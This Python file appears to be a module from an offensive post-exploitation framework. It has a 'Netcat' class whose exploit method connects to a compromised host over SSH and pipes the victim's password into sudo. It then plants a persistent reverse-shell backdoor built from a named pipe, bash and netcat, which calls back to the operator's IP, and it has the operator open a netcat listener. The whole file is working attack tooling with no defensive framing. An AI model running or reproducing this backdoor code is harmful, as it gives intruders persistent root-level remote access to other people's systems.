from module import *
import os
import cmd
from colorama import *
from definitions import *

class Netcat(Module):
    prompt = Fore.RED + "(nc) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using netcat module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53920, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")
        raw_input("Enter the following command in another terminal: nc -v -n -l -p %s" % port)
        print(GOOD + "Initializing backdoor...")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S rm /tmp/f;")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mkfifo /tmp/f;")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.core.localIP + " %s > sudo nohup /tmp/f &" % port)
        print(GOOD + "Netcat backdoor on port %s attempted." % port)
